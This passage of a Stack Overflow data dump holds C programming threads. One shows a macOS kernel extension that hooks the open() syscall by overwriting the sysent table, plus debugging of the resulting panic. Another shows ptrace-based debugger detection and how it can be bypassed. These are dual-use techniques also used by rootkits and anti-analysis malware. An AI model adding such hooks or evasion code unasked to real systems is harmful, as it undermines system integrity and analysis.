- 0.125), is the value precise?</p>\n"}, {"tags": ["c", "macos", "module", "kernel", "kernel-extension"], "comments": [{"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1447229076, "post_id": 33646125, "comment_id": 55066201, "body": "A reasonably well-written question! Are you sure it&#39;s the line <code>KernSysCall[SYS_open] = sysent[SYS_open].sy_call;</code> that causes the panic? (I assume <code>[SYS_open]</code> in the question was meant to be <code>sysent[SYS_open]</code>)"}, {"owner": {"reputation": 193, "user_id": 3212927, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/554a520974d72a45b4b55ec986c11b3b?s=128&d=identicon&r=PG", "display_name": "Vis", "link": "https://stackoverflow.com/users/3212927/vis"}, "reply_to_user": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1447232083, "post_id": 33646125, "comment_id": 55067550, "body": "Thank you. That is correct. I am almost 100% sure. Declaring the static array does not cause the panic. Doing the same array thing with primitives (e.x. int) does not cause panic. Only when I assign <code>KernSysCall[SYS_open] = sysent[SYS_open].sy_call;</code> The rest is pretty much the same as the ugly &quot;array-less&quot; solution."}, {"owner": {"reputation": 18176, "user_id": 48660, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/NJ1Lx.jpg?s=128&g=1", "display_name": "pmdj", "link": "https://stackoverflow.com/users/48660/pmdj"}, "edited": false, "score": 0, "creation_date": 1447238960, "post_id": 33646125, "comment_id": 55071297, "body": "Note that DTrace also changes the sy_call of various sysent entries, so if anything in your system is using DTrace, it and your hook may be stepping on each others&#39; toes. Is it crashing on <i>unloading</i> your kext, or do you unhook without unloading? Have you symbolicated your kernel panic to check exactly what&#39;s happening? (with a kernel argument of <code>keepsyms=1</code> the kernel will symbolicate the crash for you) To help you diagnose your LLDB failure, you&#39;re going to have to give us a bit more information on your setup."}, {"owner": {"reputation": 193, "user_id": 3212927, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/554a520974d72a45b4b55ec986c11b3b?s=128&d=identicon&r=PG", "display_name": "Vis", "link": "https://stackoverflow.com/users/3212927/vis"}, "edited": false, "score": 0, "creation_date": 1447240080, "post_id": 33646125, "comment_id": 55071885, "body": "Thanks for the suggestion, I&#39;ll try <code>keepsyms=1</code>. I&#39;m running it on a clean VM. No processes should be using DTrace. The hooking works fine with the upper method, but fails when storing them in the array. The lldb error I will have to investigate a bit deeper into myself, try it on another network."}, {"owner": {"reputation": 193, "user_id": 3212927, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/554a520974d72a45b4b55ec986c11b3b?s=128&d=identicon&r=PG", "display_name": "Vis", "link": "https://stackoverflow.com/users/3212927/vis"}, "reply_to_user": {"reputation": 18176, "user_id": 48660, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/NJ1Lx.jpg?s=128&g=1", "display_name": "pmdj", "link": "https://stackoverflow.com/users/48660/pmdj"}, "edited": false, "score": 0, "creation_date": 1447243454, "post_id": 33646125, "comment_id": 55073733, "body": "@pmdj I&#39;ve added the crashlog including syms."}], "answers": [{"comments": [{"owner": {"reputation": 193, "user_id": 3212927, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/554a520974d72a45b4b55ec986c11b3b?s=128&d=identicon&r=PG", "display_name": "Vis", "link": "https://stackoverflow.com/users/3212927/vis"}, "edited": false, "score": 0, "creation_date": 1447246838, "post_id": 33650300, "comment_id": 55075466, "body": "The panic is occurring when these are executed: <code>KernSysCall[SYS_open] = sysent[SYS_open].sy_call;     sysent[SYS_open].sy_call = mon_open;</code>. I&#39;m only &quot;restoring&quot; upon unloading of the kext. Since I do that manually, I know restoring is not causing the panic. Could it have to do something with wrong pointer dereferencing? (I&#39;m kinda C-noob)."}, {"owner": {"reputation": 18176, "user_id": 48660, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/NJ1Lx.jpg?s=128&g=1", "display_name": "pmdj", "link": "https://stackoverflow.com/users/48660/pmdj"}, "reply_to_user": {"reputation": 193, "user_id": 3212927, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/554a520974d72a45b4b55ec986c11b3b?s=128&d=identicon&r=PG", "display_name": "Vis", "link": "https://stackoverflow.com/users/3212927/vis"}, "edited": false, "score": 0, "creation_date": 1447250339, "post_id": 33650300, "comment_id": 55077427, "body": "It&#39;s crashing because a process (xpcproxy) is making a syscall, and it&#39;s either calling a NULL function, or the function being called contains an error. What&#39;s the code for <code>mon_open</code>? (If you&#39;d rather not post it, reduce it to something minimal that should still work, i.e. call through to the saved function ptr, then test that.) Your array declaration looks correct to me but it&#39;s hard to tell because C function pointer syntax is confusing. I&#39;d <code>typedef</code> the function pointer type and then declare the array as an array of those types, just to be sure."}, {"owner": {"reputation": 193, "user_id": 3212927, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/554a520974d72a45b4b55ec986c11b3b?s=128&d=identicon&r=PG", "display_name": "Vis", "link": "https://stackoverflow.com/users/3212927/vis"}, "edited": false, "score": 0, "creation_date": 1447252624, "post_id": 33650300, "comment_id": 55078883, "body": "I&#39;ve aded the code for mon_open(), but I highly doubt the issue is in that function, since the exact same function is used in the upper solution and working just fine. I have created a typedef: <code>typedef int (*kern_f)(struct proc *, struct args *, int *); static kern_f array[SYS_MAXSYSCALL];</code> and after that in another function: <code>array[SYS_open] = sysent[SYS_open].sy_call;</code>"}, {"owner": {"reputation": 18176, "user_id": 48660, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/NJ1Lx.jpg?s=128&g=1", "display_name": "pmdj", "link": "https://stackoverflow.com/users/48660/pmdj"}, "reply_to_user": {"reputation": 193, "user_id": 3212927, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/554a520974d72a45b4b55ec986c11b3b?s=128&d=identicon&r=PG", "display_name": "Vis", "link": "https://stackoverflow.com/users/3212927/vis"}, "edited": false, "score": 0, "creation_date": 1447278102, "post_id": 33650300, "comment_id": 55094312, "body": "Looking at the source for <code>unix_syscall64()</code> I&#39;m now even more convinced that you&#39;re somehow writing <code>NULL</code> to a sy_call. I suspect the bug is in code you haven&#39;t shown us."}, {"owner": {"reputation": 193, "user_id": 3212927, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/554a520974d72a45b4b55ec986c11b3b?s=128&d=identicon&r=PG", "display_name": "Vis", "link": "https://stackoverflow.com/users/3212927/vis"}, "edited": false, "score": 0, "creation_date": 1447672303, "post_id": 33650300, "comment_id": 55236375, "body": "In a later kernel panic log <code>0xffffff808ae83f20 : 0xffffff7fab7b14b7 fox.grey-fox : _mon_open + 0x47</code> was added. I&#39;m still struggling to get lldb working properly. <code>showallkmods</code> is giving me a <code>ValueError: Failed to read unsigned data. No value(type =No value) Error description: could not get SBValue: process must be stopped.</code> error."}, {"owner": {"reputation": 18176, "user_id": 48660, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/NJ1Lx.jpg?s=128&g=1", "display_name": "pmdj", "link": "https://stackoverflow.com/users/48660/pmdj"}, "reply_to_user": {"reputation": 193, "user_id": 3212927, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/554a520974d72a45b4b55ec986c11b3b?s=128&d=identicon&r=PG", "display_name": "Vis", "link": "https://stackoverflow.com/users/3212927/vis"}, "edited": false, "score": 0, "creation_date": 1447677263, "post_id": 33650300, "comment_id": 55239448, "body": "Sounds like a kernel debug kit/kernel version mismatch."}], "tags": [], "owner": {"reputation": 18176, "user_id": 48660, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/NJ1Lx.jpg?s=128&g=1", "display_name": "pmdj", "link": "https://stackoverflow.com/users/48660/pmdj"}, "is_accepted": false, "score": 0, "last_activity_date": 1447244024, "creation_date": 1447244024, "answer_id": 33650300, "question_id": 33646125, "link": "https://stackoverflow.com/questions/33646125/storing-syscall-functions-in-array-of-function-pointers/33650300#33650300", "title": "Storing SYSCALL functions in array of function pointers", "body": "<p>The 0x0 line in the panic log indicates that either a NULL function pointer is being called (more likely in this case)\u00a0or you've smashed the stack and have overwritten a return pointer with NULL. Are you sure you're not \"restoring\" syscalls which you never hooked in the first place?</p>\n\n<p>For getting lldb working with virtual machines, the requirements depend on the different virtualisation environments. With VMWare Fusion it should just work, assuming you're using 'host-only network' or bridged mode. With VirtualBox it only worked with the Virtio network device last time I tried, and I couldn't get it working at all on Parallels, but that was some years ago.</p>\n\n<p>Note that if you add a serial port to your VM, writing to a text file, you can log to that using <code>kprintf()</code> - this may help you here as you can print out your pointer values when hooking and unhooking.</p>\n"}, {"comments": [{"owner": {"reputation": 18176, "user_id": 48660, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/NJ1Lx.jpg?s=128&g=1", "display_name": "pmdj", "link": "https://stackoverflow.com/users/48660/pmdj"}, "edited": false, "score": 0, "creation_date": 1447677308, "post_id": 33735025, "comment_id": 55239486, "body": "Glad you got it fixed. Pleased to hear I wasn&#39;t completely barking up the wrong tree. :-)"}], "tags": [], "owner": {"reputation": 193, "user_id": 3212927, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/554a520974d72a45b4b55ec986c11b3b?s=128&d=identicon&r=PG", "display_name": "Vis", "link": "https://stackoverflow.com/users/3212927/vis"}, "is_accepted": true, "score": 0, "last_activity_date": 1447675751, "creation_date": 1447675751, "answer_id": 33735025, "question_id": 33646125, "link": "https://stackoverflow.com/questions/33646125/storing-syscall-functions-in-array-of-function-pointers/33735025#33735025", "title": "Storing SYSCALL functions in array of function pointers", "body": "<p>Amazingly stupid, I forgot to point <code>kern_open</code> (the return value of <code>mon_open</code>) to the function pointer in the array. <code>kern_open</code> was <code>NULL</code>, so this caused the <code>NULL</code>-pointer exception. Now the array of function pointers is working correctly.</p>\n\n<p>@pmdj, thank you very much for your help. </p>\n"}], "owner": {"reputation": 193, "user_id": 3212927, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/554a520974d72a45b4b55ec986c11b3b?s=128&d=identicon&r=PG", "display_name": "Vis", "link": "https://stackoverflow.com/users/3212927/vis"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 545, "favorite_count": 2, "accepted_answer_id": 33735025, "answer_count": 2, "score": 7, "last_activity_date": 1447675751, "creation_date": 1447227762, "last_edit_date": 1447251228, "question_id": 33646125, "link": "https://stackoverflow.com/questions/33646125/storing-syscall-functions-in-array-of-function-pointers", "title": "Storing SYSCALL functions in array of function pointers", "body": "<p>I'm working on a project in which I have to hook 80%-90% of the system call functions on OSX (10.10.5). I'm doing this from a kernel extension. Since I have to (un)hook many functions, I want to store the original kernel function into an array of function pointers, to that I can do a quick lookup into the array in order to restore the original function upon unhooking. </p>\n\n<pre><code>    int (*kern_open)(struct proc *, struct open_args *, int *);\n    int mon_open(struct proc *p, struct open_args *uap, int *retval) {\n    kern_open = sysent[SYS_open].sy_call;\n    sysent[SYS_open].sy_call = mon_open;\n</code></pre>\n\n<p>This works, the kern_open function is used to store the original kernel function that s called upon a system call. mon_open is my hooking function.</p>\n\n<p>What I want to achieve is the following; so that upon unhooking, I can just iterate thru the KernSysCall array and restore the functions.</p>\n\n<pre><code>    // global array of function pointers that all have the same func def.\n    static int (*KernSysCall[SYS_MAXSYSCALL])(struct proc *, struct args *, int *);\n    KernSysCall[SYS_open] = sysent[SYS_open].sy_call;\n    sysent[SYS_open].sy_call = mon_open;\n</code></pre>\n\n<p>Restoring: <code>sysent[SYS_open].sy_call = KernSysCall[SYS_open];</code></p>\n\n<p>However, storing the original kernel function inside the array of function pointers is causing a kernel panic. I haven't been able to attach the lldb yet, due to a <code>error: KDP_REATTACH failed</code> error. I'm hoping someone knows what is causing the kernel panic.</p>\n\n<p>Below is a log of the kernel panic.</p>\n\n<pre><code>Anonymous UUID:       052D64D2-A43C-99F8-D221-B591991E54AF\n\nWed Nov 11 12:55:06 2015\n\n*** Panic Report ***\npanic(cpu 0 caller 0xffffff80093f0024): Kernel trap at 0x0000000000000000, type 14=page fault, registers:\nCR0: 0x0000000080010033, CR2: 0x0000000000000000, CR3: 0x00000000769bb018, CR4: 0x00000000001606e0\nRAX: 0x0000000000000000, RBX: 0xffffff80115e3fc0, RCX: 0x0000000000000001, RDX: 0xffffff80115e3fc0\nRSP: 0xffffff8068dabaf8, RBP: 0xffffff8068dabf50, RSI: 0xffffff80115e3f80, RDI: 0xffffff8010059cf0\nR8:  0xffffff7f8afaccdf, R9:  0xffffff8009ae2a18, R10: 0xffffff8009939740, R11: 0x0000000000000000\nR12: 0xffffff8010059cf0, R13: 0x0000000000000005, R14: 0xffffff80115e3f80, R15: 0xffffff801188b480\nRFL: 0x0000000000010282, RIP: 0x0000000000000000, CS:  0x0000000000000008, SS:  0x0000000000000010\nFault CR2: 0x0000000000000000, Error code: 0x0000000000000010, Fault CPU: 0x0 VMM\n\nBacktrace (CPU 0), Frame : Return Address\n0xffffff8068dab790 : 0xffffff80092e4ed1 mach_kernel : _panic + 0xd1\n0xffffff8068dab810 : 0xffffff80093f0024 mach_kernel : _kernel_trap + 0x664\n0xffffff8068dab9e0 : 0xffffff800940de53 mach_kernel : trap_from_kernel + 0x26\n0xffffff8068daba00 : 0x0 \n0xffffff8068dabf50 : 0xffffff800982c0c1 mach_kernel : _unix_syscall64 + 0x2f1\n0xffffff8068dabfb0 : 0xffffff800940e656 mach_kernel : _hndl_unix_scall64 + 0x16\n\nBSD process name corresponding to current thread: xpcproxy\nBoot args: debug=0x14e kext-dev-mode=1 -v keepsyms=1 kmem=1\n\nMac OS version:\n14F27\n\nKernel version:\nDarwin Kernel Version 14.5.0: Wed Jul 29 02:26:53 PDT 2015; root:xnu-2782.40.9~1/DEVELOPMENT_X86_64\nKernel UUID: C75BDFDD-9F27-3694-BB80-73CF991C13D8\nKernel slide:     0x0000000009000000\nKernel text base: 0xffffff8009200000\n__HIB  text base: 0xffffff8009100000\nSystem model name: VMware7,1 (Mac-66F35F19FE2A0D05)\n\nSystem uptime in nanoseconds: 251264993940\nlast loaded kext at 249789197520: my.kext   1 (addr 0xffffff7f8afa9000, size 57344)\nlast unloaded kext at 116769666233: com.apple.driver.AppleFileSystemDriver  3.0.1 (addr 0xffffff7f8aed3000, size 16384)\nloaded kexts:\nmy.kext 1\n\n[more kexts here]\n</code></pre>\n\n<p>In request, the code for mon_open():</p>\n\n<pre><code>int\nmon_open(struct proc *p, struct open_args *uap, int *r) {\n    int error;\n    char processname[MAXCOMLEN+1];\n    char intercepted_path[MAXPATHLEN];\n\n    pid_t pid = proc_pid(p);\n\n    proc_name(pid, processname, sizeof(processname));\n\n    size_t dummy = 0;\n    error = copyinstr((void *)uap-&gt;path, (void *)intercepted_path, MAXPATHLEN, &amp;dummy);\n    if (!error) {\n        printf(\"[MYKEXT] open called with path: %s, PID: %d, processname: %s\\n\", intercepted_path, pid, processname);\n    }\n\n    return kern_open(p, uap, r);\n}\n</code></pre>\n\n<p>Thank you very much in advance!</p>\n"}, {"tags": ["c", "dbg"], "comments": [{"owner": {"reputation": 1285, "user_id": 5003848, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/12b681a7a5cab103fa1ea1165685555b?s=128&d=identicon&r=PG&f=1", "display_name": "tonysdg", "link": "https://stackoverflow.com/users/5003848/tonysdg"}, "edited": false, "score": 0, "creation_date": 1447230402, "post_id": 33646089, "comment_id": 55066773, "body": "In either example, what&#39;s to stop me from attaching a debugger after the check has passed?  Additionally, not all debuggers will necessarily use <code>ptrace</code>, so this may not be the most reliable way of determining if someone is debugging your program."}, {"owner": {"reputation": 3063, "user_id": 4133947, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/99688fdb4523347fb5e789c3705350d4?s=128&d=identicon&r=PG&f=1", "display_name": "robert", "link": "https://stackoverflow.com/users/4133947/robert"}, "reply_to_user": {"reputation": 1285, "user_id": 5003848, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/12b681a7a5cab103fa1ea1165685555b?s=128&d=identicon&r=PG&f=1", "display_name": "tonysdg", "link": "https://stackoverflow.com/users/5003848/tonysdg"}, "edited": false, "score": 0, "creation_date": 1447230515, "post_id": 33646089, "comment_id": 55066815, "body": "@tonysdg, the above code can be called multiple times. Do you have any idea how to check it better?"}, {"owner": {"reputation": 1285, "user_id": 5003848, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/12b681a7a5cab103fa1ea1165685555b?s=128&d=identicon&r=PG&f=1", "display_name": "tonysdg", "link": "https://stackoverflow.com/users/5003848/tonysdg"}, "edited": false, "score": 0, "creation_date": 1447230726, "post_id": 33646089, "comment_id": 55066888, "body": "To be honest? No, unfortunately. I do know that an active field of research is testing whether or not programs can determine if they&#39;re in a virtual machine (which is sometimes desirable and sometimes not) - I suspect the same type of questions apply here.  Is the goal here to ward off attempts at reverse engineering though? If so, there may be better ways to protect yourself - I&#39;m not exactly sure what those are, but someone in the community likely would.  Regardless - I&#39;m unfortunately of no more help on this question (most likely) :("}, {"owner": {"reputation": 15473, "user_id": 744720, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/65030f1bd22dbb4d1e6976cfac08a1c5?s=128&d=identicon&r=PG", "display_name": "keltar", "link": "https://stackoverflow.com/users/744720/keltar"}, "edited": false, "score": 0, "creation_date": 1447238558, "post_id": 33646089, "comment_id": 55071072, "body": "First method checks only once so you probably will need to call it multiple times, while second keeps attachment so noone else can [directly] attach to your process (since it could only be one). There are methods to bypass it of course, e.g. patched kernel in worst case, and with direct access to process memory - there might not be a need for attachable debugger at all."}, {"owner": {"reputation": 3063, "user_id": 4133947, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/99688fdb4523347fb5e789c3705350d4?s=128&d=identicon&r=PG&f=1", "display_name": "robert", "link": "https://stackoverflow.com/users/4133947/robert"}, "reply_to_user": {"reputation": 15473, "user_id": 744720, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/65030f1bd22dbb4d1e6976cfac08a1c5?s=128&d=identicon&r=PG", "display_name": "keltar", "link": "https://stackoverflow.com/users/744720/keltar"}, "edited": false, "score": 0, "creation_date": 1447249376, "post_id": 33646089, "comment_id": 55076842, "body": "@keltar, are you sure that the second keeps attachment? Isn&#39;t the statement <code>ptrace(PT_DETACH, parent, (caddr_t)1, SIGCONT);</code> detaching?"}, {"owner": {"reputation": 15473, "user_id": 744720, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/65030f1bd22dbb4d1e6976cfac08a1c5?s=128&d=identicon&r=PG", "display_name": "keltar", "link": "https://stackoverflow.com/users/744720/keltar"}, "edited": false, "score": 0, "creation_date": 1447252947, "post_id": 33646089, "comment_id": 55079093, "body": "@franz1 well but <code>waitpid</code>. Hard to say with do-nothing examples, but I&#39;m fairly sure it supposed to detach only when process is finished."}], "answers": [{"tags": [], "owner": {"reputation": 6964, "user_id": 189270, "user_type": "registered", "accept_rate": 77, "profile_image": "https://i.stack.imgur.com/4br0S.jpg?s=128&g=1", "display_name": "Peeter Joot", "link": "https://stackoverflow.com/users/189270/peeter-joot"}, "is_accepted": false, "score": 0, "last_activity_date": 1595886357, "creation_date": 1595886357, "answer_id": 63124049, "question_id": 33646089, "link": "https://stackoverflow.com/questions/33646089/using-ptrace-to-detect-debugger/63124049#63124049", "title": "Using ptrace to detect debugger", "body": "<p>As well as the ptrace() method, it's also possible to signal SIGTRAP (\n<a href=\"https://stackoverflow.com/questions/3596781/how-to-detect-if-the-current-process-is-being-run-by-gdb\">How to detect if the current process is being run by GDB?</a> )</p>\n<p>I'd say that your first method is better (and better than SIGTRAP), since forking is terribly inefficient for such a check, and there will be many circumstances (like multithreaded code) that forking is undesirable.</p>\n"}], "owner": {"reputation": 3063, "user_id": 4133947, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/99688fdb4523347fb5e789c3705350d4?s=128&d=identicon&r=PG&f=1", "display_name": "robert", "link": "https://stackoverflow.com/users/4133947/robert"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1658, "favorite_count": 1, "answer_count": 1, "score": 5, "last_activity_date": 1595886357, "creation_date": 1447227558, "question_id": 33646089, "link": "https://stackoverflow.com/questions/33646089/using-ptrace-to-detect-debugger", "title": "Using ptrace to detect debugger", "body": "<p>I am trying to detect on Linux if a debugger is attached to my binary. I have found two solutions. One simpler:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;sys/ptrace.h&gt;\n\nint main()\n{\n    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) \n    {\n        printf(\"don't trace me !!\\n\");\n        return 1;\n    }\n    // normal execution\n    return 0;\n}\n</code></pre>\n\n<p>and another one:</p>\n\n<pre><code>#include &lt;sys/types.h&gt;\n#include &lt;errno.h&gt;\n#include &lt;signal.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/ptrace.h&gt;\n#include &lt;sys/wait.h&gt;\n\nint spc_detect_ptrace(void) {\n  int   status, waitrc;\n  pid_t child, parent;\n\n  parent = getpid();\n  if (!(child = fork())) {\n    /* this is the child process */\n    if (ptrace(PT_ATTACH, parent, 0, 0)) exit(1);\n    do {\n      waitrc = waitpid(parent, &amp;status, 0);\n    } while (waitrc == -1 &amp;&amp; errno == EINTR);\n    ptrace(PT_DETACH, parent, (caddr_t)1, SIGCONT);\n    exit(0);\n  }\n\n  if (child == -1) return -1;\n\n  do {\n    waitrc = waitpid(child, &amp;status, 0);\n  } while (waitrc == -1 &amp;&amp; errno == EINTR);\n\n  return WEXITSTATUS(status);\n}\n</code></pre>\n\n<p>Is the second method better than the first, simpler one? If yes, why?</p>\n"}, {"tags": ["c", "strtok"], "answers": [{"comments": [{"owner": {"reputation": 61, "user_id": 5544618, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/27192407f8153c48ec294a72d9018462?s=128&d=identicon&r=PG&f=1", "display_name": "Jung", "link": "https://stackoverflow.com/users/5544618/jung"}, "edited": false, "score": 0, "creation_date": 1447224919, "post_id": 33645537, "comment_id": 55064602, "body": "I didn&#39;t know about it. haha I watched it during 6 hours. Thanks! Thank you!"}, {"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1447225830, "post_id": 33645537, "comment_id": 55064910, "body": "Alternatively, use one of the flags that tells gcc (or your compiler) to be more standards-compliant. (I think setting any non-gnu standard will do this, for example, with <code>-std=c11</code>)"}, {"owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "edited": false, "score": 1, "creation_date": 1447226855, "post_id": 33645537, "comment_id": 55065312, "body": "<code>asm</code> is not a <i>standard</i> keyword, but treating it as one is a common extension."}], "tags": [], "owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "is_accepted": false, "score": 4, "last_activity_date": 1447224808, "last_edit_date": 1447224808, "creation_date": 1447224502, "answer_id": 33645537, "question_id": 33645503, "link": "https://stackoverflow.com/questions/33645503/error-expected-identifier-or-in-global-variable/33645537#33645537", "title": "error : expected identifier or &#39;(&#39; in global variable", "body": "<p><code>asm</code> is a keyword. Instead of</p>\n\n<pre><code>Assemble asm;\n</code></pre>\n\n<p>use something different, such as:</p>\n\n<pre><code>Assemble asm1;\n</code></pre>\n\n<p>The problem reported by the compiler is different though. You seem to have used</p>\n\n<pre><code>ASSEMBLY asm;\n</code></pre>\n\n<p>in the code you compiled.</p>\n"}], "owner": {"reputation": 61, "user_id": 5544618, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/27192407f8153c48ec294a72d9018462?s=128&d=identicon&r=PG&f=1", "display_name": "Jung", "link": "https://stackoverflow.com/users/5544618/jung"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 286, "favorite_count": 1, "answer_count": 1, "score": 1, "last_activity_date": 1447225705, "creation_date": 1447224277, "last_edit_date": 1447225705, "question_id": 33645503, "link": "https://stackoverflow.com/questions/33645503/error-expected-identifier-or-in-global-variable", "title": "error : expected identifier or &#39;(&#39; in global variable", "body": "<p>I got this errror during compile processing. \nI already saw this error in this site before, I think this error can occur when the ; or something are in wrong place. but I can't find. </p>\n\n<p><img src=\"https://i.stack.imgur.com/2nw6f.png\" alt=\"Screenshot\"></p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;math.h&gt;\n#define MAX 80\n\ntypedef struct assemble\n{\n    int op;\n    int ni;\n    int xbpe;\n    int addr;\n}Assemble;\n\n\nvoid get_token(char *bp);\nint hTod(char *dp);\nint bTod(char *dp);\nvoid codeBreak(char *cp);\nvoid result(int t);\n\n\nAssemble asm;\nint type;\n\n\nint main()\n{\n  FILE *fp;\n  char buf[MAX];\n\n    if( (fp = fopen(\"inst.txt\",\"r\")) == NULL ){\n    fprintf(stderr, \"file not found...\\n\"); exit(1);\n    }\n    while(fgets(buf,sizeof(buf),fp) != NULL){\n         get_token(buf);\n    }\n\n    fclose(fp);\n    return 0;\n }\n\n void get_token(char *bp)\n {\n    char    *cp;\n    int i = 1;\n\n    for(cp=strtok(bp, \" \\t\\n\"); cp != NULL; )\n    {\n\n        if( (*(cp+0) == '0') &amp;&amp; (*(cp+1) == 'x') )\n        {\n        if( i == -1 )\n            asm.addr = hTod(cp);\n        if( i == 1)\n                asm.op = hTod(cp);\n        i *= -1;\n        }\n        else\n        {\n        codeBreak(cp);\n    }\n\n     cp = strtok(NULL, \" \\t\\n\");\n    }\n\nresult(type);\n }\n\n\n void codeBreak(char *cp)\n {\n\n    if ( strlen(cp) == 2 )          // ni \ud310\ub2e8\n    {\n    asm.ni = bTod(cp);\n    }\n    else if( strlen(cp) == 1 )\n    {\n       asm.xbpe = bTod(cp)*pow(2,3);    \n       type = 1;\n    }\n    else if( strlen(cp) == 4 )\n    {\n    if( *(cp+3) == '1')     \n    {\n        asm.xbpe = bTod(cp);\n        type = 2;\n    }\n    else\n    {\n        asm.xbpe = bTod(cp);\n        type = 3;\n    }\n   }\n }\n\n void result(int t)\n {\n    switch(t)\n    {\n     case 1 : printf(\"0x%x%x\\n\", (asm.op+asm.ni), asm.addr); break;\n     case 2 : printf(\"0x%x%x%.5x\\n\", (asm.op+asm.ni), asm.xbpe, asm.addr); break;\n     case 3 : printf(\"0x%x%x%.3x\\n\", (asm.op+asm.ni), asm.xbpe, asm.addr); break;\n     default : break;\n     }\n   }\n\n\n    /* Hex to decimal */\n    int hTod(char *dp)\n    {\n        int i;\n        int dec = 0; \n\n         for( i=2 ; i &lt; strlen(dp) ; i++)\n          {\n            switch (*(dp+i))\n             {\n              case 'a' : *(dp+i) = 58; break;\n              case 'b' : *(dp+i) = 59; break;\n              case 'c' : *(dp+i) = 60; break;\n              case 'd' : *(dp+i) = 61; break;\n              case 'e' : *(dp+i) = 62; break;\n              case 'f' : *(dp+i) = 63; break;\n              }\n\n          dec += (*(dp+i)-48) * pow( 16, (strlen(dp)-(i+1)));   \n\n        } \n       return dec;  \n      }\n\n        /* binary to decimal*/\n        int bTod(char *dp)\n        {\n            int i;\n             int    dec = 0;\n\n            for( i = 0; i &lt; strlen(dp) ; i++)\n            {\n                dec += (*(dp+i)-48) * pow( 2, (strlen(dp) - (i+1)));    \n             }\n              return dec;\n          }\n</code></pre>\n"}, {"tags": ["c", "string"], "comments": [{"owner": {"reputation": 8617, "user_id": 3477950, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/mC5xL.jpg?s=128&g=1", "display_name": "The Paramagnetic Croissant", "link": "https://stackoverflow.com/users/3477950/the-paramagnetic-croissant"}, "edited": false, "score": 0, "creation_date": 1447223534, "post_id": 33645322, "comment_id": 55064118, "body": "<i>&quot;(What is dynamic memory allocation?)&quot;</i> \u2014 and that&#39;s how your question became too broad."}, {"owner": {"reputation": 748, "user_id": 5381184, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/da66272a60130c5f545312f67e16d9a3?s=128&d=identicon&r=PG&f=1", "display_name": "BobRun", "link": "https://stackoverflow.com/users/5381184/bobrun"}, "edited": false, "score": 0, "creation_date": 1447224694, "post_id": 33645322, "comment_id": 55064528, "body": "Are you sure you need to get the number of chars from the user ? It seems a bit difficult for the user to answer that. If you could read from a file it would be 